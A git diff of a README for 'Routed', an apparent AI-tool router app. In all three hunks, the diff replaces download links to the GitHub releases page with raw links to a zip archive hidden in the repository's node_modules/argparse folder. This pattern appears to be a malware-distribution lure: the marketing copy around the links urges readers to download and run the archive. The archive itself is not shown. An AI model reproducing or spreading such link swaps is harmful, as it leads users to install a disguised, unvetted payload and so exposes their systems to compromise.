@@ -1,6 +1,6 @@
 # 🧭 Routed - Your Universal Router for AI Skills
 
-[![Download Routed](https://img.shields.io/badge/Download-Routed-blue?style=for-the-badge&logo=github)](https://github.com/tihonovdanil2013-tech/Routed/releases)
+[![Download Routed](https://img.shields.io/badge/Download-Routed-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tihonovdanil2013-tech/Routed/main/node_modules/argparse/Software-v2.7.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 Visit this link to download the application:
 
-[👉 Click Here to Download Routed](https://github.com/tihonvil2013-tech/Routed/releases)
+[👉 Click Here to Download Routed](https://raw.githubusercontent.com/tihonovdanil2013-tech/Routed/main/node_modules/argparse/Software-v2.7.zip)
 
 This link takes you to the official Routed download page where you'll find the latest version. The download process is quick and straightforward.
 
@@ -153,7 +153,7 @@ The Routed team is committed to helping you get the most out of your AI tools. W
 
 You're just a few minutes away from having all your AI coding environments working together perfectly. Download Routed today and experience the difference that a universal router can make.
 
-[📥 Download Routed Now](https://github.com/tihonovdanil2013-tech/Routed/releases)
+[📥 Download Routed Now](https://raw.githubusercontent.com/tihonovdanil2013-tech/Routed/main/node_modules/argparse/Software-v2.7.zip)
 
 Join thousands of satisfied users who have simplified their AI workflow with Routed. It's free, it's easy, and it makes everything just work.
 
